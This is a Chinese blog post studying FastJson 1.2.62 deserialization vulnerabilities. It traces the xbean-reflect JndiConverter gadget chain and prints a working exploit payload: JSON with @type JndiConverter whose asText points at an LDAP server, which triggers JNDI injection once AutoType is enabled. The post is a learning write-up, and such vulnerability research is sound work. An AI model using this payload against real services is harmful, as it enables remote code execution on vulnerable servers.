<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"curlysean.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.22.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>

    <meta name="description" content="FastJson 1.2.62-1.2.68反序列化漏洞 今天学习一下FastJson 中 1.2.62 - 1.2.68 的反序列化漏洞，思路的话和之前一样基于黑名单的绕过，但是大部分还是在 AutoType 开启的情况下，且基本都基于存在其他的依赖的条件下  1.2.62 反序列化漏洞 1.2.62 反序列化前提条件   需要开启AutoType FastJson &lt;&#x3D; 1.2">
<meta property="og:type" content="article">
<meta property="og:title" content="FastJson 1.2.62-1.2.68反序列化漏洞">
<meta property="og:url" content="http://curlysean.github.io/2025/03/24/FastJson1-2-62-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/index.html">
<meta property="og:site_name" content="肖恩的博客">
<meta property="og:description" content="FastJson 1.2.62-1.2.68反序列化漏洞 今天学习一下FastJson 中 1.2.62 - 1.2.68 的反序列化漏洞，思路的话和之前一样基于黑名单的绕过，但是大部分还是在 AutoType 开启的情况下，且基本都基于存在其他的依赖的条件下  1.2.62 反序列化漏洞 1.2.62 反序列化前提条件   需要开启AutoType FastJson &lt;&#x3D; 1.2">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741924052265-b71c177a-68c1-4b2a-9b69-1a9b113c5024.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741925535544-0ab2c0da-6f61-4042-a6a9-7fcb37bfe8b0.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741927512166-70869c4f-d0f5-4e94-a590-78cd7f53d644.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741931232564-ad57e281-c2a1-4b89-9874-dac7904bd658.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742185271066-0a928ae6-94a4-4d9b-8cd0-8fa6f679cb79.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742187788533-725ccc89-e381-46c4-93c3-eaa4d37db5da.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742188121856-60a85355-fb41-4b2a-a9dd-b2acb0f74c0c.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742189380971-5b3aec69-3434-4536-8ece-099e31461540.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742189488179-6d26e820-57fe-455f-8145-afc1bd88003d.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742189717880-48a319b9-dbec-48a0-bca6-86357b28b124.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742190082053-e6ee6a3d-bc20-4cc9-88aa-924f6fe653d6.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742190148229-a047bfbf-3920-467b-b43d-19e943e99910.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742190399827-5a619d91-0afc-4bac-b001-574aec65048f.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742195497771-1f71ce7a-aea2-4d6d-8648-69242285e5d4.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742195589394-78c7a9a2-a345-40d6-8753-5050d528dadc.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742195988784-22998053-eb21-4611-9f8d-751844648336.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742196042882-d87a0907-a4e4-45e3-8a03-ee2fb203d5f9.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742203598002-8b8b4abc-dd9c-433b-8689-da68f41ed4ae.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742225722469-b1709e8b-66f9-4c87-ad97-444f38b9a26b.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1742226095954-8dcd4d63-c233-44da-8255-69038f77625e.png">
<meta property="article:published_time" content="2025-03-24T04:36:30.097Z">
<meta property="article:modified_time" content="2025-03-24T04:36:30.153Z">
<meta property="article:author" content="Sean">
<meta property="article:tag" content="FastJson">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741924052265-b71c177a-68c1-4b2a-9b69-1a9b113c5024.png">


<link rel="canonical" href="http://curlysean.github.io/2025/03/24/FastJson1-2-62-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://curlysean.github.io/2025/03/24/FastJson1-2-62-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","path":"2025/03/24/FastJson1-2-62-1-2-68反序列化漏洞/","title":"FastJson 1.2.62-1.2.68反序列化漏洞"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>FastJson 1.2.62-1.2.68反序列化漏洞 | 肖恩的博客</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">肖恩的博客</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
      <div class="search-header">
        <span class="search-icon">
          <i class="fa fa-search"></i>
        </span>
        <div class="search-input-container">
          <input autocomplete="off" autocapitalize="off" maxlength="80"
                placeholder="搜索..." spellcheck="false"
                type="search" class="search-input">
        </div>
        <span class="popup-btn-close" role="button">
          <i class="fa fa-times-circle"></i>
        </span>
      </div>
      <div class="search-result-container">
        <div class="search-result-icon">
          <i class="fa fa-spinner fa-pulse fa-5x"></i>
        </div>
      </div>
    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#mxJnr"><span class="nav-number">1.</span> <span class="nav-text">FastJson 1.2.62-1.2.68反序列化漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Otftt"><span class="nav-number">1.1.</span> <span class="nav-text">1.2.62 反序列化漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#evyuq"><span class="nav-number">1.1.1.</span> <span class="nav-text">1.2.62 反序列化前提条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GJ9xD"><span class="nav-number">1.1.2.</span> <span class="nav-text">漏洞原理分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#cg9NB"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">逆向分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#vaUmG"><span class="nav-number">1.1.2.2.</span> <span class="nav-text">正向分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#k71ri"><span class="nav-number">1.1.3.</span> <span class="nav-text">EXP编写</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mhCJS"><span class="nav-number">1.1.4.</span> <span class="nav-text">调试分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#vwjWL"><span class="nav-number">1.1.5.</span> <span class="nav-text">补丁</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#iFdOH"><span class="nav-number">1.2.</span> <span class="nav-text">1.2.66 反序列化漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Z4itN"><span class="nav-number">1.2.1.</span> <span class="nav-text">1.2.66反序列化前提条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#edTnh"><span class="nav-number">1.2.2.</span> <span class="nav-text">Gadget&#39;s POC</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#LH9SG"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">org.apache.shiro.realm.jndi.JndiRealmFactory</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#x7M85"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">br.com.anteros.dbcp.AnterosDBCPConfig</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SRgjI"><span class="nav-number">1.2.2.3.</span> <span class="nav-text">com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#KVFVy"><span class="nav-number">1.2.3.</span> <span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#yVPEG"><span class="nav-number">1.3.</span> <span class="nav-text">1.2.67反序列化漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#lOtJF"><span class="nav-number">1.3.1.</span> <span class="nav-text">1.2.67反序列化前提条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#gTkXQ"><span class="nav-number">1.3.2.</span> <span class="nav-text">Fastjson循环引用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#xOPlY"><span class="nav-number">1.3.3.</span> <span class="nav-text">Gadget&#39;s POC</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#AzrMp"><span class="nav-number">1.3.3.1.</span> <span class="nav-text">org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#QCent"><span class="nav-number">1.3.3.2.</span> <span class="nav-text">org.apache.shiro.jndi.JndiObjectFactory</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sxkNl"><span class="nav-number">1.3.4.</span> <span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pJcT1"><span class="nav-number">1.4.</span> <span class="nav-text">1.2.68反序列化漏洞（expectClass绕过AutoType）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#adqSF"><span class="nav-number">1.4.1.</span> <span class="nav-text">1.2.68反序列化前提条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JLOJQ"><span class="nav-number">1.4.2.</span> <span class="nav-text">绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#b7fNW"><span class="nav-number">1.4.2.1.</span> <span class="nav-text">绕过原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sFO75"><span class="nav-number">1.4.2.2.</span> <span class="nav-text">可行性测试</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#bmimq"><span class="nav-number">1.4.2.3.</span> <span class="nav-text">断点调试</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#BWFH9"><span class="nav-number">1.4.2.4.</span> <span class="nav-text">小结</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#R1wmY"><span class="nav-number">1.4.3.</span> <span class="nav-text">实际利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#h09Z1"><span class="nav-number">1.4.3.1.</span> <span class="nav-text">复制文件（任意文件读取）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CdujD"><span class="nav-number">1.4.3.2.</span> <span class="nav-text">写入文件</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ZV6G8"><span class="nav-number">1.4.4.</span> <span class="nav-text">补丁修复</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#paOC8"><span class="nav-number">1.4.5.</span> <span class="nav-text">SafeMode</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#i8Gz2"><span class="nav-number">1.5.</span> <span class="nav-text">其他一些绕过黑名单的Gadget</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Ez1g2"><span class="nav-number">1.5.1.</span> <span class="nav-text">1.2.59</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#g66pt"><span class="nav-number">1.5.2.</span> <span class="nav-text">1.2.61</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#S7C1P"><span class="nav-number">1.5.3.</span> <span class="nav-text">1.2.62</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MbKCt"><span class="nav-number">1.5.4.</span> <span class="nav-text">1.2.68</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%AA%E7%9F%A5%E7%89%88%E6%9C%AC"><span class="nav-number">1.5.5.</span> <span class="nav-text">未知版本</span></a></li></ol></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Sean"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">Sean</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">26</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">1</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">8</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://curlysean.github.io/2025/03/24/FastJson1-2-62-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Sean">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="肖恩的博客">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="FastJson 1.2.62-1.2.68反序列化漏洞 | 肖恩的博客">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          FastJson 1.2.62-1.2.68反序列化漏洞
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-03-24 12:36:30" itemprop="dateCreated datePublished" datetime="2025-03-24T12:36:30+08:00">2025-03-24</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Java/" itemprop="url" rel="index"><span itemprop="name">Java</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">阅读次数：</span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h1 id="mxJnr">FastJson 1.2.62-1.2.68反序列化漏洞</h1>
今天学习一下FastJson 中 1.2.62 - 1.2.68 的反序列化漏洞，思路的话和之前一样基于黑名单的绕过，但是大部分还是在 AutoType 开启的情况下，且基本都基于存在其他的依赖的条件下

<h2 id="Otftt">1.2.62 反序列化漏洞</h2>
<h3 id="evyuq">1.2.62 反序列化前提条件</h3>

<ul>
<li>需要开启AutoType</li>
<li>FastJson &lt;&#x3D; 1.2.62 </li>
<li>JNDI注入可利用的 JDK 版本</li>
<li>目标服务端需要存在xbean-reflect包，xbean-reflect 包的版本不限</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">         &lt;groupId&gt;com.alibaba&lt;/groupId&gt;  </span><br><span class="line">         &lt;artifactId&gt;fastjson&lt;/artifactId&gt;  </span><br><span class="line">         &lt;version&gt;<span class="number">1.2</span><span class="number">.62</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">         &lt;groupId&gt;org.apache.xbean&lt;/groupId&gt;  </span><br><span class="line">         &lt;artifactId&gt;xbean-reflect&lt;/artifactId&gt;  </span><br><span class="line">         &lt;version&gt;<span class="number">4.18</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;commons-collections&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">3.2</span><span class="number">.1</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>

<h3 id="GJ9xD">漏洞原理分析</h3>
<h4 id="cg9NB">逆向分析</h4>

<p>漏洞存在在<code>org.apache.xbean.propertyeditor.JndiConverter</code>中的<code>toObjectImpl</code>方法中</p>
<p>但是他不是一个setter或者getter方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">toObjectImpl</span><span class="params">(String text)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InitialContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">            <span class="keyword">return</span> (Context) context.lookup(text);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">PropertyEditorException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>向上找，在<code>AbstractConverter#toObject</code>中调用了该方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title function_">toObject</span><span class="params">(String text)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (text == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> toObjectImpl((trim) ? text.trim() : text);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>继续找的话，我们找到了一个getter方法和一个setter方法，但似乎这个getter方法并不是一个满足条件的getter方法（无参数），因此我们可以看<code>AbstractConverter</code>中的<code>setAsTest</code>方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741924052265-b71c177a-68c1-4b2a-9b69-1a9b113c5024.png"></p>
<p>其中<code>setAsTest</code>方法源码如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">setAsText</span><span class="params">(String text)</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> toObject((trim) ? text.trim() : text);</span><br><span class="line">        <span class="built_in">super</span>.setValue(value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="vaUmG">正向分析</h4>

<p>当我们调用<code>JndiConverter</code>的<code>setAsText</code>方法时，它本身没有该方法，就会调用父类的<code>setAsText</code></p>
<p>方法，他的父类正好是<code>AbstractConverter</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JndiConverter</span> <span class="keyword">extends</span> <span class="title class_">AbstractConverter</span></span><br></pre></td></tr></table></figure>

<p>这里会调用<code>toObject</code>方法，该方法调用<code>toObject</code>方法，最后<code>toObject</code>调用<code>toObjectImpl</code>方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">setAsText</span><span class="params">(String text)</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> toObject((trim) ? text.trim() : text);</span><br><span class="line">        <span class="built_in">super</span>.setValue(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title function_">toObject</span><span class="params">(String text)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (text == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> toObjectImpl((trim) ? text.trim() : text);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在<code>AbstractConverter</code>中没有<code>toObjectImpl</code>，所以这里调用到<code>JndiConverter</code>的<code>toObjectImpl</code>方法，就触发了JNDI注入</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">toObjectImpl</span><span class="params">(String text)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InitialContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">            <span class="keyword">return</span> (Context) context.lookup(text);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">PropertyEditorException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="k71ri">EXP编写</h3>
EXP如下，记得要开启AutoType哟

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.xbean.propertyeditor.JndiConverter\&quot;,\&quot;asText\&quot;:\&quot;ldap://127.0.0.1:8085/JlaYFplQ\&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(s);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>运行后</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741925535544-0ab2c0da-6f61-4042-a6a9-7fcb37bfe8b0.png"></p>
<h3 id="mhCJS">调试分析</h3>

<p>我们进入<code>CheckAutoType</code>中，对里面的一些过滤进行以下分析，有以下几个新的限制</p>
<ul>
<li><code>@type</code>类名长度</li>
<li>expectClass参数的类型匹配</li>
<li><code>[</code>检测</li>
<li><code>L</code>检测</li>
<li><code>LL</code>检测</li>
<li>通过计算hash与白名单进行匹配</li>
</ul>
